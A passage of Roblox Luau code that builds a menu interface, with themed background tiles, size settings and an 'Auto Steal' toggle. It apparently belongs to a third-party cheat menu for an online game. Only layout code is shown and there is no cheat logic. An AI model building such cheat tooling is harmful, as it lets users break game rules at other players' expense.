G.TextLabel_67.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_67.Text = "STEAL"
G.TextLabel_67.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_67.TextSize = 13
G.TextLabel_67.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_67.Parent = G.Frame_111

G.Frame_112 = Instance.new("Frame")
G.Frame_112.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_112.BackgroundTransparency = 1
G.Frame_112.BorderSizePixel = 0
G.Frame_112.LayoutOrder = 901
G.Frame_112.Size = UDim2.new(1, 0, 0, 40)
G.Frame_112.Parent = G.WavePage_Combat

G.TextLabel_68 = Instance.new("TextLabel")
G.TextLabel_68.BackgroundTransparency = 1
G.TextLabel_68.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_68.Size = UDim2.new(1, -148, 1, 0)
G.TextLabel_68.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_68.Text = "Auto Steal"
G.TextLabel_68.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_68.TextSize = 11
G.TextLabel_68.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_68.Parent = G.Frame_112

G.TextButton_48 = Instance.new("TextButton")
G.TextButton_48.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.TextButton_48.BorderSizePixel = 0
G.TextButton_48.Position = UDim2.new(1, -128, 0.5, -12)
G.TextButton_48.Size = UDim2.new(0, 58, 0, 24)
G.TextButton_48.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_48.Text = "Normal"
G.TextButton_48.TextColor3 = Color3.fromRGB(240, 245, 255)
G.TextButton_48.TextSize = 10
G.TextButton_48.Parent = G.Frame_112

G.UICorner_102 = Instance.new("UICorner")
G.UICorner_102.CornerRadius = UDim.new(0, 4)
G.UICorner_102.Parent = G.TextButton_48

G.UIStroke_64 = Instance.new("UIStroke")
G.UIStroke_64.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_64.Color = Color3.fromRGB(18, 38, 75)
G.UIStroke_64.Parent = G.TextButton_48

G.WaveTogglePill_29 = Instance.new("Frame")
G.WaveTogglePill_29.Name = "WaveTogglePill"
G.WaveTogglePill_29.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_29.BorderSizePixel = 0
G.WaveTogglePill_29.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_29.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_29.ZIndex = 7
G.WaveTogglePill_29:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_29.Parent = G.Frame_112

G.UICorner_103 = Instance.new("UICorner")
G.UICorner_103.CornerRadius = UDim.new(0, 9)
G.UICorner_103.Parent = G.WaveTogglePill_29

G.UIStroke_65 = Instance.new("UIStroke")
G.UIStroke_65.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_65.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_65.Parent = G.WaveTogglePill_29

G.WaveToggleDot_29 = Instance.new("Frame")
G.WaveToggleDot_29.Name = "WaveToggleDot"
G.WaveToggleDot_29.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_29.BorderSizePixel = 0
G.WaveToggleDot_29.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_29.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_29.ZIndex = 8
G.WaveToggleDot_29.Parent = G.WaveTogglePill_29

G.UICorner_104 = Instance.new("UICorner")
G.UICorner_104.CornerRadius = UDim.new(0, 6)
G.UICorner_104.Parent = G.WaveToggleDot_29

G.TextButton_49 = Instance.new("TextButton")
G.TextButton_49.BackgroundTransparency = 1
G.TextButton_49.BorderSizePixel = 0
G.TextButton_49.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_49.ZIndex = 9
G.TextButton_49.Text = ""
G.TextButton_49.Parent = G.WaveTogglePill_29

G.WavePage_Interface = Instance.new("ScrollingFrame")
G.WavePage_Interface.Name = "WavePage_Interface"
G.WavePage_Interface.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.WavePage_Interface.BackgroundTransparency = 1
G.WavePage_Interface.BorderSizePixel = 0
G.WavePage_Interface.Position = UDim2.new(0, 3, 0, 92)
G.WavePage_Interface.Size = UDim2.new(1, -3, 1, -92)
G.WavePage_Interface.Visible = false
G.WavePage_Interface.ZIndex = 3
G.WavePage_Interface.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.WavePage_Interface.CanvasSize = UDim2.new(0, 0, 0, 0)
G.WavePage_Interface.ScrollBarImageColor3 = Color3.fromRGB(45, 130, 230)
G.WavePage_Interface.ScrollBarImageTransparency = 0.5
G.WavePage_Interface.ScrollBarThickness = 3
G.WavePage_Interface.Parent = G.MainOuter

G.UIListLayout_8 = Instance.new("UIListLayout")
G.UIListLayout_8.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_8.Parent = G.WavePage_Interface

G.UIPadding_7 = Instance.new("UIPadding")
G.UIPadding_7.PaddingBottom = UDim.new(0, 12)
G.UIPadding_7.PaddingLeft = UDim.new(0, 8)
G.UIPadding_7.PaddingRight = UDim.new(0, 8)
G.UIPadding_7.PaddingTop = UDim.new(0, 6)
G.UIPadding_7.Parent = G.WavePage_Interface

G.Frame_113 = Instance.new("Frame")
G.Frame_113.BackgroundTransparency = 1
G.Frame_113.BorderSizePixel = 0
G.Frame_113.LayoutOrder = 1
G.Frame_113.Size = UDim2.new(1, 0, 0, 28)
G.Frame_113.Parent = G.WavePage_Interface

G.TextLabel_69 = Instance.new("TextLabel")
G.TextLabel_69.BackgroundTransparency = 1
G.TextLabel_69.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_69.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_69.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_69.Text = "BACKGROUND"
G.TextLabel_69.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_69.TextSize = 13
G.TextLabel_69.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_69.Parent = G.Frame_113

G.Frame_114 = Instance.new("Frame")
G.Frame_114.BackgroundTransparency = 1
G.Frame_114.BorderSizePixel = 0
G.Frame_114.LayoutOrder = 2
G.Frame_114.Position = UDim2.new(0, 4, 0, 0)
G.Frame_114.Size = UDim2.new(1, -8, 0, 58)
G.Frame_114.Parent = G.WavePage_Interface

G.ScrollingFrame = Instance.new("ScrollingFrame")
G.ScrollingFrame.BackgroundTransparency = 1
G.ScrollingFrame.BorderSizePixel = 0
G.ScrollingFrame.Position = UDim2.new(0, 34, 0, 0)
G.ScrollingFrame.Size = UDim2.new(1, -64, 0, 58)
G.ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.X
G.ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
G.ScrollingFrame.ScrollBarImageTransparency = 1
G.ScrollingFrame.ScrollBarThickness = 0
G.ScrollingFrame.ScrollingDirection = Enum.ScrollingDirection.X
G.ScrollingFrame.Parent = G.Frame_114

G.UIListLayout_9 = Instance.new("UIListLayout")
G.UIListLayout_9.FillDirection = Enum.FillDirection.Horizontal
G.UIListLayout_9.Padding = UDim.new(0, 5)
G.UIListLayout_9.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_9.VerticalAlignment = Enum.VerticalAlignment.Center
G.UIListLayout_9.Parent = G.ScrollingFrame

G.UIPadding_8 = Instance.new("UIPadding")
G.UIPadding_8.PaddingLeft = UDim.new(0, 3)
G.UIPadding_8.PaddingRight = UDim.new(0, 3)
G.UIPadding_8.Parent = G.ScrollingFrame

G.BgTheme_default = Instance.new("ImageButton")
G.BgTheme_default.Name = "BgTheme_default"
G.BgTheme_default.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.BgTheme_default.BorderSizePixel = 0
G.BgTheme_default.LayoutOrder = 1
G.BgTheme_default.Size = UDim2.new(0, 42, 0, 42)
G.BgTheme_default.ZIndex = 8
G.BgTheme_default.AutoButtonColor = false
G.BgTheme_default.Image = "rbxassetid://130935005587354"
G.BgTheme_default.ScaleType = Enum.ScaleType.Crop
G.BgTheme_default.Parent = G.ScrollingFrame

G.UICorner_105 = Instance.new("UICorner")
G.UICorner_105.Parent = G.BgTheme_default

G.UIStroke_66 = Instance.new("UIStroke")
G.UIStroke_66.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_66.Color = Color3.fromRGB(45, 130, 230)
G.UIStroke_66.Thickness = 2
G.UIStroke_66.Parent = G.BgTheme_default

G.BgTheme_dio = Instance.new("ImageButton")
G.BgTheme_dio.Name = "BgTheme_dio"
G.BgTheme_dio.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.BgTheme_dio.BorderSizePixel = 0
G.BgTheme_dio.LayoutOrder = 2
G.BgTheme_dio.Size = UDim2.new(0, 42, 0, 42)
G.BgTheme_dio.ZIndex = 8
G.BgTheme_dio.AutoButtonColor = false
G.BgTheme_dio.Image = "rbxthumb://type=Asset&id=100992322816352&w=420&h=420"
G.BgTheme_dio.ImageTransparency = 0.15999999642372131
G.BgTheme_dio.ScaleType = Enum.ScaleType.Crop
G.BgTheme_dio.Parent = G.ScrollingFrame

G.UICorner_106 = Instance.new("UICorner")
G.UICorner_106.Parent = G.BgTheme_dio

G.UIStroke_67 = Instance.new("UIStroke")
G.UIStroke_67.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_67.Color = Color3.fromRGB(25, 90, 185)
G.UIStroke_67.Parent = G.BgTheme_dio

G.BgTheme_kira = Instance.new("ImageButton")
G.BgTheme_kira.Name = "BgTheme_kira"
G.BgTheme_kira.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.BgTheme_kira.BorderSizePixel = 0
G.BgTheme_kira.LayoutOrder = 3
G.BgTheme_kira.Size = UDim2.new(0, 42, 0, 42)
G.BgTheme_kira.ZIndex = 8
G.BgTheme_kira.AutoButtonColor = false
G.BgTheme_kira.Image = "rbxthumb://type=Asset&id=134610782065909&w=420&h=420"
G.BgTheme_kira.ImageTransparency = 0.15999999642372131
G.BgTheme_kira.ScaleType = Enum.ScaleType.Crop
G.BgTheme_kira.Parent = G.ScrollingFrame

G.UICorner_107 = Instance.new("UICorner")
G.UICorner_107.Parent = G.BgTheme_kira

G.UIStroke_68 = Instance.new("UIStroke")
G.UIStroke_68.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_68.Color = Color3.fromRGB(25, 90, 185)
G.UIStroke_68.Parent = G.BgTheme_kira

G.BgTheme_kingcrimson = Instance.new("ImageButton")
G.BgTheme_kingcrimson.Name = "BgTheme_kingcrimson"
G.BgTheme_kingcrimson.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.BgTheme_kingcrimson.BorderSizePixel = 0
G.BgTheme_kingcrimson.LayoutOrder = 4
G.BgTheme_kingcrimson.Size = UDim2.new(0, 42, 0, 42)
G.BgTheme_kingcrimson.ZIndex = 8
G.BgTheme_kingcrimson.AutoButtonColor = false
G.BgTheme_kingcrimson.Image = "rbxasset://5a9ca42d5ed939bad79ba73d52810774/wave_theme_tile_kingcrimson_v3_sfilescatboxmoeevj09mjpg.png"
G.BgTheme_kingcrimson.ImageTransparency = 0.15999999642372131
G.BgTheme_kingcrimson.ScaleType = Enum.ScaleType.Crop
G.BgTheme_kingcrimson:SetAttribute("WaveImageRequest", "https://files.catbox.moe/evj09m.jpg")
G.BgTheme_kingcrimson.Parent = G.ScrollingFrame

G.UICorner_108 = Instance.new("UICorner")
G.UICorner_108.Parent = G.BgTheme_kingcrimson

G.UIStroke_69 = Instance.new("UIStroke")
G.UIStroke_69.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_69.Color = Color3.fromRGB(25, 90, 185)
G.UIStroke_69.Parent = G.BgTheme_kingcrimson

G.BgTheme_t636k9 = Instance.new("ImageButton")
G.BgTheme_t636k9.Name = "BgTheme_t636k9"
G.BgTheme_t636k9.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.BgTheme_t636k9.BorderSizePixel = 0
G.BgTheme_t636k9.LayoutOrder = 5
G.BgTheme_t636k9.Size = UDim2.new(0, 42, 0, 42)
G.BgTheme_t636k9.ZIndex = 8
G.BgTheme_t636k9.AutoButtonColor = false
G.BgTheme_t636k9.Image = "rbxasset://5a9ca42d5ed939bad79ba73d52810774/wave_theme_tile_t636k9_v3_sfilescatboxmoedxf36ajpg.png"
G.BgTheme_t636k9.ImageTransparency = 0.15999999642372131
G.BgTheme_t636k9.ScaleType = Enum.ScaleType.Crop
G.BgTheme_t636k9:SetAttribute("WaveImageRequest", "https://files.catbox.moe/dxf36a.jpg")
G.BgTheme_t636k9.Parent = G.ScrollingFrame

G.UICorner_109 = Instance.new("UICorner")
G.UICorner_109.Parent = G.BgTheme_t636k9

G.UIStroke_70 = Instance.new("UIStroke")
G.UIStroke_70.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_70.Color = Color3.fromRGB(25, 90, 185)
G.UIStroke_70.Parent = G.BgTheme_t636k9

G.BgTheme_customwave = Instance.new("ImageButton")
G.BgTheme_customwave.Name = "BgTheme_customwave"
G.BgTheme_customwave.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.BgTheme_customwave.BorderSizePixel = 0
G.BgTheme_customwave.LayoutOrder = 6
G.BgTheme_customwave.Size = UDim2.new(0, 42, 0, 42)
G.BgTheme_customwave.ZIndex = 8
G.BgTheme_customwave.AutoButtonColor = false
G.BgTheme_customwave.Image = "rbxasset://5a9ca42d5ed939bad79ba73d52810774/wave_theme_tile_customwave_v3_sfilescatboxmoed1cwp9png.png"
G.BgTheme_customwave.ImageTransparency = 0.15999999642372131
G.BgTheme_customwave.ScaleType = Enum.ScaleType.Crop
G.BgTheme_customwave:SetAttribute("WaveImageRequest", "https://files.catbox.moe/d1cwp9.png")
G.BgTheme_customwave.Parent = G.ScrollingFrame

G.UICorner_110 = Instance.new("UICorner")
G.UICorner_110.Parent = G.BgTheme_customwave

G.UIStroke_71 = Instance.new("UIStroke")
G.UIStroke_71.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_71.Color = Color3.fromRGB(25, 90, 185)
G.UIStroke_71.Parent = G.BgTheme_customwave

G.TextButton_50 = Instance.new("TextButton")
G.TextButton_50.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.TextButton_50.BackgroundTransparency = 0.10000000149011612
G.TextButton_50.BorderSizePixel = 0
G.TextButton_50.Position = UDim2.new(0, 0, 0.5, -16)
G.TextButton_50.Size = UDim2.new(0, 24, 0, 32)
G.TextButton_50.ZIndex = 12
G.TextButton_50.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_50.Text = "<"
G.TextButton_50.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextButton_50.TextSize = 16
G.TextButton_50.Parent = G.Frame_114

G.UICorner_111 = Instance.new("UICorner")
G.UICorner_111.CornerRadius = UDim.new(0, 6)
G.UICorner_111.Parent = G.TextButton_50

G.UIStroke_72 = Instance.new("UIStroke")
G.UIStroke_72.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_72.Color = Color3.fromRGB(25, 90, 185)
G.UIStroke_72.Parent = G.TextButton_50

G.TextButton_51 = Instance.new("TextButton")
G.TextButton_51.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.TextButton_51.BackgroundTransparency = 0.10000000149011612
G.TextButton_51.BorderSizePixel = 0
G.TextButton_51.Position = UDim2.new(1, -24, 0.5, -16)
G.TextButton_51.Size = UDim2.new(0, 24, 0, 32)
G.TextButton_51.ZIndex = 12
G.TextButton_51.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_51.Text = ">"
G.TextButton_51.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextButton_51.TextSize = 16
G.TextButton_51.Parent = G.Frame_114

G.UICorner_112 = Instance.new("UICorner")
G.UICorner_112.CornerRadius = UDim.new(0, 6)
G.UICorner_112.Parent = G.TextButton_51

G.UIStroke_73 = Instance.new("UIStroke")
G.UIStroke_73.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_73.Color = Color3.fromRGB(25, 90, 185)
G.UIStroke_73.Parent = G.TextButton_51

G.Frame_115 = Instance.new("Frame")
G.Frame_115.BackgroundTransparency = 1
G.Frame_115.BorderSizePixel = 0
G.Frame_115.LayoutOrder = 102
G.Frame_115.Size = UDim2.new(1, 0, 0, 2)
G.Frame_115.Parent = G.WavePage_Interface

G.Frame_116 = Instance.new("Frame")
G.Frame_116.BackgroundTransparency = 1
G.Frame_116.BorderSizePixel = 0
G.Frame_116.LayoutOrder = 3
G.Frame_116.Size = UDim2.new(1, 0, 0, 28)
G.Frame_116.Parent = G.WavePage_Interface

G.TextLabel_70 = Instance.new("TextLabel")
G.TextLabel_70.BackgroundTransparency = 1
G.TextLabel_70.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_70.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_70.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_70.Text = "INTERFACE"
G.TextLabel_70.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_70.TextSize = 13
G.TextLabel_70.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_70.Parent = G.Frame_116

G.Frame_117 = Instance.new("Frame")
G.Frame_117.BackgroundTransparency = 1
G.Frame_117.BorderSizePixel = 0
G.Frame_117.LayoutOrder = 104
G.Frame_117.Size = UDim2.new(1, 0, 0, 2)
G.Frame_117.Parent = G.WavePage_Interface

G.ButtonsHeader = Instance.new("Frame")
G.ButtonsHeader.Name = "ButtonsHeader"
G.ButtonsHeader.BackgroundTransparency = 1
G.ButtonsHeader.BorderSizePixel = 0
G.ButtonsHeader.LayoutOrder = 100
G.ButtonsHeader.Size = UDim2.new(1, 0, 0, 28)
G.ButtonsHeader.Parent = G.WavePage_Interface

G.TextLabel_71 = Instance.new("TextLabel")
G.TextLabel_71.BackgroundTransparency = 1
G.TextLabel_71.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_71.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_71.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_71.Text = "BUTTONS"
G.TextLabel_71.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_71.TextSize = 13
G.TextLabel_71.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_71.Parent = G.ButtonsHeader

G.Frame_118 = Instance.new("Frame")
G.Frame_118.BackgroundTransparency = 1
G.Frame_118.BorderSizePixel = 0
G.Frame_118.LayoutOrder = 4
G.Frame_118.Size = UDim2.new(1, 0, 0, 38)
G.Frame_118.Parent = G.WavePage_Interface

G.TextLabel_72 = Instance.new("TextLabel")
G.TextLabel_72.BackgroundTransparency = 1
G.TextLabel_72.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_72.Size = UDim2.new(1, -120, 1, 0)
G.TextLabel_72.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_72.Text = "UI Size"
G.TextLabel_72.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_72.TextSize = 11
G.TextLabel_72.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_72.Parent = G.Frame_118

G.Frame_119 = Instance.new("Frame")
G.Frame_119.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_119.BorderSizePixel = 0
G.Frame_119.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_119.Size = UDim2.new(0, 54, 0, 26)
G.Frame_119.Parent = G.Frame_118

G.UICorner_113 = Instance.new("UICorner")
G.UICorner_113.CornerRadius = UDim.new(0, 6)
G.UICorner_113.Parent = G.Frame_119

G.UIStroke_74 = Instance.new("UIStroke")
G.UIStroke_74.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_74.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_74.Parent = G.Frame_119

G.TextBox_12 = Instance.new("TextBox")
G.TextBox_12.BackgroundTransparency = 1
G.TextBox_12.Position = UDim2.new(0, 3, 0, 0)
G.TextBox_12.Size = UDim2.new(1, -6, 1, 0)
G.TextBox_12.ZIndex = 8
G.TextBox_12.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_12.Text = "0.7"
G.TextBox_12.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox_12.TextSize = 11
G.TextBox_12.ClearTextOnFocus = false
G.TextBox_12.Parent = G.Frame_119

G.SizeDropdown_3 = Instance.new("TextButton")
G.SizeDropdown_3.Name = "SizeDropdown"
G.SizeDropdown_3.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.SizeDropdown_3.BorderSizePixel = 0
G.SizeDropdown_3.Position = UDim2.new(1, -106, 0.5, -11)
G.SizeDropdown_3.Size = UDim2.new(0, 34, 0, 22)
G.SizeDropdown_3.ZIndex = 9
G.SizeDropdown_3.Text = ""
G.SizeDropdown_3.Parent = G.Frame_118

G.UICorner_114 = Instance.new("UICorner")
G.UICorner_114.CornerRadius = UDim.new(0, 4)
G.UICorner_114.Parent = G.SizeDropdown_3

G.UIStroke_75 = Instance.new("UIStroke")
G.UIStroke_75.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_75.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_75.Parent = G.SizeDropdown_3

G.Arrow_3 = Instance.new("TextLabel")
G.Arrow_3.Name = "Arrow"
G.Arrow_3.BackgroundTransparency = 1
G.Arrow_3.Size = UDim2.new(1, 0, 1, 0)
G.Arrow_3.ZIndex = 10
G.Arrow_3.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.Arrow_3.Text = "▼"
G.Arrow_3.TextColor3 = Color3.fromRGB(70, 115, 180)
G.Arrow_3.TextSize = 16
G.Arrow_3.Parent = G.SizeDropdown_3

G.Frame_120 = Instance.new("Frame")
G.Frame_120.BackgroundTransparency = 1
G.Frame_120.BorderSizePixel = 0
G.Frame_120.ClipsDescendants = true
G.Frame_120.LayoutOrder = 5
G.Frame_120.Size = UDim2.new(1, 0, 0, 38)
G.Frame_120.Visible = false
G.Frame_120.Parent = G.WavePage_Interface

G.TextLabel_73 = Instance.new("TextLabel")
G.TextLabel_73.BackgroundTransparency = 1
G.TextLabel_73.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_73.Size = UDim2.new(1, -78, 1, 0)
G.TextLabel_73.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_73.Text = "Button Size"
G.TextLabel_73.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_73.TextSize = 11
G.TextLabel_73.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_73.Parent = G.Frame_120

G.Frame_121 = Instance.new("Frame")
G.Frame_121.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_121.BorderSizePixel = 0
G.Frame_121.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_121.Size = UDim2.new(0, 54, 0, 26)
G.Frame_121.Parent = G.Frame_120

G.UICorner_115 = Instance.new("UICorner")
G.UICorner_115.CornerRadius = UDim.new(0, 6)
G.UICorner_115.Parent = G.Frame_121

G.UIStroke_76 = Instance.new("UIStroke")
G.UIStroke_76.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_76.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_76.Parent = G.Frame_121

G.TextBox_13 = Instance.new("TextBox")
G.TextBox_13.BackgroundTransparency = 1
G.TextBox_13.Position = UDim2.new(0, 3, 0, 0)
G.TextBox_13.Size = UDim2.new(1, -6, 1, 0)
G.TextBox_13.ZIndex = 8
G.TextBox_13.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_13.Text = "0.7"
G.TextBox_13.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox_13.TextSize = 11
G.TextBox_13.ClearTextOnFocus = false
G.TextBox_13.Parent = G.Frame_121

G.Frame_122 = Instance.new("Frame")
G.Frame_122.BackgroundTransparency = 1
G.Frame_122.BorderSizePixel = 0
G.Frame_122.ClipsDescendants = true
G.Frame_122.LayoutOrder = 6
G.Frame_122.Size = UDim2.new(1, 0, 0, 38)
G.Frame_122.Visible = false
G.Frame_122.Parent = G.WavePage_Interface

G.TextLabel_74 = Instance.new("TextLabel")
G.TextLabel_74.BackgroundTransparency = 1
G.TextLabel_74.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_74.Size = UDim2.new(1, -78, 1, 0)
G.TextLabel_74.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_74.Text = "Steal Bar Size"
G.TextLabel_74.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_74.TextSize = 11
G.TextLabel_74.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_74.Parent = G.Frame_122

G.Frame_123 = Instance.new("Frame")
G.Frame_123.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_123.BorderSizePixel = 0
G.Frame_123.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_123.Size = UDim2.new(0, 54, 0, 26)
G.Frame_123.Parent = G.Frame_122

G.UICorner_116 = Instance.new("UICorner")
G.UICorner_116.CornerRadius = UDim.new(0, 6)
G.UICorner_116.Parent = G.Frame_123

G.UIStroke_77 = Instance.new("UIStroke")
G.UIStroke_77.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_77.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_77.Parent = G.Frame_123

G.TextBox_14 = Instance.new("TextBox")
G.TextBox_14.BackgroundTransparency = 1
G.TextBox_14.Position = UDim2.new(0, 3, 0, 0)
G.TextBox_14.Size = UDim2.new(1, -6, 1, 0)
G.TextBox_14.ZIndex = 8
G.TextBox_14.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_14.Text = "0.7"
G.TextBox_14.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox_14.TextSize = 11
G.TextBox_14.ClearTextOnFocus = false
G.TextBox_14.Parent = G.Frame_123

G.Frame_124 = Instance.new("Frame")
G.Frame_124.BackgroundTransparency = 1
G.Frame_124.BorderSizePixel = 0
G.Frame_124.LayoutOrder = 109
G.Frame_124.Size = UDim2.new(1, 0, 0, 2)
G.Frame_124.Parent = G.WavePage_Interface

G.Frame_125 = Instance.new("Frame")
G.Frame_125.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_125.BackgroundTransparency = 1
G.Frame_125.BorderSizePixel = 0
G.Frame_125.LayoutOrder = 7
G.Frame_125.Size = UDim2.new(1, 0, 0, 40)
G.Frame_125.Parent = G.WavePage_Interface

G.TextLabel_75 = Instance.new("TextLabel")
G.TextLabel_75.BackgroundTransparency = 1
G.TextLabel_75.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_75.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_75.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_75.Text = "Remove UI Image"
G.TextLabel_75.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_75.TextSize = 11
G.TextLabel_75.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_75.Parent = G.Frame_125

G.WaveTogglePill_30 = Instance.new("Frame")
G.WaveTogglePill_30.Name = "WaveTogglePill"
G.WaveTogglePill_30.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_30.BorderSizePixel = 0
G.WaveTogglePill_30.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_30.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_30.ZIndex = 7
G.WaveTogglePill_30:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_30.Parent = G.Frame_125

G.UICorner_117 = Instance.new("UICorner")
G.UICorner_117.CornerRadius = UDim.new(0, 9)
G.UICorner_117.Parent = G.WaveTogglePill_30

G.UIStroke_78 = Instance.new("UIStroke")
G.UIStroke_78.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_78.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_78.Parent = G.WaveTogglePill_30

G.WaveToggleDot_30 = Instance.new("Frame")
G.WaveToggleDot_30.Name = "WaveToggleDot"
G.WaveToggleDot_30.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_30.BorderSizePixel = 0
